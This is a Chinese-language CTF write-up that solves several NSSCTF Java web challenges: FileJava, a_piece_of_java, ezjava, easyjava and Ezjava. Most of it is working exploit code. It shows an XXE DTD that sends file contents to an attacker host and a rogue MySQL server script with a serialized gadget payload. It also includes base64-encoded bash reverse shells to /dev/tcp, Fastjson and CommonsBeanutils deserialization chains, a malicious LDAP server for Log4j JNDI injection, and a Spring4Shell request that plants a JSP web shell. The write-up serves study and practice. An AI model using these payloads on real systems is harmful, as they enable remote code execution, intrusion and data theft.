---
title: NSSCTF靶场JAVA题全解（已完结）
---

*作者：Narcher*	*时间：2024/4/18*	*分类：writeup*

<!--more-->

### [网鼎杯 2020青龙组]FileJava

打开网址，发现存在文件上传功能，上传后还可以进行文件下载，我们就随便上传一个文件，然后下载抓包看看有什么可利用的东西：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713343965190.png" alt="1713343965190" style="zoom:67%;" />

猜测可能存在任意文件读取漏洞，我们修改filename的值：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713344035012.png" alt="1713344035012" style="zoom:50%;" />

随便一改就发现它自己报错把路径什么的全都爆出来了，我们尝试读取flag：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713344117252.png" alt="1713344117252" style="zoom:50%;" />

发现存在flag字符串便会导致禁止读取，那我们根据前边的报错找一下web.xml这种敏感文件（一般位于WEB-INF目录下）：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713344230364.png" alt="1713344230364" style="zoom:50%;" />

成功读取，之后把相关文件全都读取下载下来：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713344278093.png" alt="1713344278093" style="zoom:50%;" />

还有两个就不截图了，一样的，反正下载下来之后反编译查看源码开始分析就行了：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713344371209.png" alt="1713344371209" style="zoom:50%;" />

关键部分如上所示，看见try里边的代码就自然而然想到了CVE-2014-3529

下面我搭了个本地测试的环境，大致调试看了一下，关键的地方说一下：

首先，我们要利用这个漏洞，需要对xlsx文件解压缩，并修改其中的[Content_Types].xml文件，切记不能改文件名，因为执行过程前会有对这个文件的判断：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713345391969.png" alt="1713345391969" style="zoom:50%;" />

其次，xxe注入在这里触发：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713345242815.png" alt="1713345242815" style="zoom:67%;" />

对于题目而言也是一样的，我们直接先unzip一个xlsx文件，在[Content_Types].xml文件中的第二行添加（注：vps处填写自己的服务器公网IP和http服务开放的端口）：

```xml
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://vps/file.dtd">
%remote;%int;%send;
]>
```

然后在vps上挂一个file.dtd，并开启http服务，并nc监听7777端口，file.dtd内容如下：

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vps:7777?p=%file;'>">
```

把解压缩并修改后的文件重新压缩回xlsx文件，命令：`zip -r xxe.xlsx *`

并命名为如下格式：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240417173533790.png" alt="image-20240417173533790" style="zoom:50%;" />

之后上传就可以了：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713346769288.png" alt="1713346769288" style="zoom:67%;" />

成功获取flag



### [羊城杯 2020]a_piece_of_java

把下载到的源码使用`jar xvf xxx.jar`命令反编译得到源码，在/hello中发现反序列化触发点：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713402609902.png" alt="1713402609902" style="zoom:67%;" />

也就是说我们需要把序列化的数据放在http头的cookie中即可执行反序列化，但deserialize中还有一个过滤：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713402686688.png" alt="1713402686688" style="zoom: 67%;" />

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713402710520.png" alt="1713402710520" style="zoom: 67%;" />

上述白名单只允许通过它自己规定的类和java.lang里的类，所以我们直接用ysoserialize中的链子是打不通的，继续看：

```java
private void connect() {
    String url = "jdbc:mysql://" + this.host + ":" + this.port + "/jdbc?user=" + this.username + "&password=" + this.password + "&connectTimeout=3000&socketTimeout=6000";

    try {
        this.connection = DriverManager.getConnection(url);
    } catch (Exception var3) {
        var3.printStackTrace();
    }

}
```

在DatabaseInfo.class中可以看到如上代码，很明显就是让我们利用MYSQL JDBC反序列化这个漏洞，我们再去看看依赖包中的版本：

```java
mysql-connector-java-8.0.19.jar
```

既然是8.x版本，我们可以直接把相关的链子拿过来用：

```java
jdbc:mysql://x.x.x.x:3307/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

至于MYSQL服务器我们去copy一下大佬写好的脚本：

```python
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                # 获取payload
                payload_content=get_payload_content()
                # 计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # 计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3307

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

至于payload文件我们需要使用ysoserial生成，命令如下：

```java
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,xxxxxxxxxxxxx}|{base64,-d}|{bash,-i}" > payload
```

xxxxxxxxxxxxx处填写反弹shell命令的base64编码，例如：`/bin/bash -i >& /dev/tcp/1.1.1.1/7777 0>&1`的base64：`L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvNzc3NyAwPiYx`

而在题目中触发MYSQL JDBC的链子还是需要我们自己构造，我们从DatabaseInfo.class的connect()方法往上溯源，可以找到DatabaseInfo.class的checkAllInfo()方法，而checkAllInfo()方法被题目中重写的InfoInvocationHandler的调用：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713403355745.png" alt="1713403355745" style="zoom:67%;" />

那么我们的目标就很明确了，就是先给DatabaseInfo类的实例赋值为8.x版本的链子形式，之后将其赋值给InfoInvocationHandler类的实例中的info，并使用动态代理触发invoke()方法进而执行一系列反序列化流程，最终通过MYSQL JDBC获取到vps上的payload进而执行无过滤的反序列化将shell反弹到vps上即可，链子如下：

```java
import gdufs.challenge.web.model.*;
import gdufs.challenge.web.invocation.InfoInvocationHandler;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception{

        DatabaseInfo databaseinfo=new DatabaseInfo();
        databaseinfo.setHost("IP");//此处填写自己的vps公网IP
        databaseinfo.setPort("3307");
        databaseinfo.setUsername("1");
        databaseinfo.setPassword("1&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");

        InfoInvocationHandler infoInvocationHandler=new InfoInvocationHandler(databaseinfo);

        Info info=(Info)Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler);

        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(info);
        objectOutputStream.close();

        String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));
        System.out.println(str);
    }
}
```

之后python3 mysql.py开启mysql服务器，并nc监听接收反弹的端口，再访问/hello，在cookie处填写上述脚本的链子：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713408797290.png" alt="1713408797290" style="zoom:67%;" />

去vps处查看获取shell，直接cat /flag获取flag：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1713408943323.png" alt="1713408943323" style="zoom:67%;" />

（本题需要了解MYSQL JDBC反序列化相关知识点，当然只是简单的知道流程就能做题，但我还是从这里立一个FLAG吧，在复现完NSSCTF的所有Java题之后一定要抽空调试学习一下具体流程，这题的复现参考了很多大佬的博客，感觉还是需要不断学习才能提高自己）

### [HZNUCTF 2023 final]ezjava

刚开始让这题坑了，一直dns探测不到，结果发现是校园网的问题，换了个网就好了

与此同时，貌似有个过滤，我用${java:os}读不到东西，并且貌似还有个时间限制，有时候dns能探测到，有时候探测不到，总之这题有点玄学，废话不多说了，直接开始：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1714034466155.png" alt="1714034466155" style="zoom:67%;" />

看到log和fastjson就基本上明白这个题考什么了，大体思路就是用log4j的远程代码执行漏洞来触发jndi注入，在jndi注入中触发fastjson 1.2.48的反序列化漏洞

我们先dns探测一下：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1714034666350.png" alt="1714034666350" style="zoom: 50%;" />

payload:

```xml
${jndi:dns://${sys:java.version}.tzey97.dnslog.cn}
```

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1714092528352.png" alt="1714092528352" style="zoom:67%;" />

探测出jdk版本为8u222，大于8u191，因此不能直接jndi注入拿shell，这就需要hint的Fastjson 1.2.48的反序列化漏洞了。

大致思路为：利用LDAP直接返回一个恶意的序列化对象，JNDI注入对该序列化对象进行反序列化操作，利用反序列化来完成命令执行。那么这里我们就需要利用LDAP返回依赖Fastjson 1.2.48的序列化链

网上流传的都是1.2.83的通杀链，我这里也就直接拿过来了：

```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Fastjson83 {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] genPayload(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception{


        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload("bash -c {echo,<bash -i >& /dev/tcp/1.1.1.1/7777 0>&1的base64编码>}|{base64,-d}|{bash,-i}")});//这里需要更改
        setValue(templates, "_name", "111");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));

//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
//        objectInputStream.readObject();

    }
}
```

将这个的输出填写到jndi高版本绕过的脚本中：

```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;
//高版本LDAP绕过

public class LDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://localhost/#Evail"};
        int port = 6666;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port);
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData", Base64.decode("<上述脚本的输出>"));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

之后将其打包成jar，上传到vps上边，直接运行的同时监听相应端口，然后在请求的url后添加如下图所示的payload即可：

```xml
${jndi:ldap://1.1.1.1:6666/Evail}<此处需要更改vps地址>
```

之后如图所示获取到shell

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/1714093242860.png" alt="1714092528352" style="zoom:67%;" />



### [MTCTF 2022]easyjava

这题听说在NSS上开起来的有问题，那就直接去https://github.com/CTF-Archives/2022-mtgxs-web-easyjava这里，把jar包下下来自己搭个本地环境打吧

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824164248614.png" alt="1714092528352" style="zoom:67%;" />

反序列化入口点在这里，但要想进入这个路由得先经过下边的shiro认证：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824164713631.png" alt="image-20240824164713631" style="zoom: 67%;" />

其中，登录认证部分如下：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824164919951.png" alt="image-20240824164919951" style="zoom:67%;" />

我们没有用户名密码，就只能考虑shiro的权限绕过了，本题的shiro版本为1.5.2，于是使用[CVE-2020-11989](https://www.cnblogs.com/nice0e3/p/16248252.html#cve-2020-11989)

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824165327739.png" alt="image-20240824165327739" style="zoom:67%;" />

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824165255763.png" alt="image-20240824165255763" style="zoom:67%;" />

成功绕过，之后看一下反序列化的黑名单：

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824165407913.png" alt="image-20240824165407913" style="zoom:67%;" />

emm，第一个黑名单感觉像是少了个.

不过无所谓，因为有commons-beanutils-1.9.4.jar依赖，直接CB链子打就完了

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class cb {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);
        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties", new AttrCompare());
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);
        Class<PriorityQueue> c = PriorityQueue.class;
        Field comparatorField = c.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,beanComparator);
        //序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt"));
        oos.writeObject(priorityQueue);
        //反序列化
//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt"));
//        ois.readObject();
    }
}
```

之后base64编码后打就完了，这里要特别注意一下环境的依赖版本配置，不一样的话可能会报错serialVersionUID的问题

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824173520985.png" alt="image-20240824173520985" style="zoom:67%;" />



### [NUSTCTF 2022 新生赛]Ezjava

#### flag1

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824201850799.png" alt="image-20240824201850799" style="zoom:67%;" />

考查javabean的赋值操作，payload：`/addUser1?department.name1=njust&name=2022`

#### flag2

<img src="NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240824203200401.png" alt="image-20240824203200401" style="zoom:67%;" />

考查CVE-2022-22965 Spring Framework 任意文件写入漏洞

post传参：

```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{prefix}ijava.io.InputStream+in+%3d+Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%3bint+a+%3d+-1%3bbyte[]+b+%3d+new+byte[4096]%3bout.print("</pre>")%3bwhile((a%3din.read(b))!%3d-1){+out.println(new+String(b))%3b+}out.print("</pre>")%3b%25{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=njust2022.njust&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

其中的具体含义：

```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=rce_20220329 （写入shell内容）
 
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp（修改tomcat配置日志文件后缀jsp）
 
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT（写入shell在网站根目录）
 
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell（写入shell文件名称）<br><br>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=（文件日期格式（实际构造为空值即可））
```

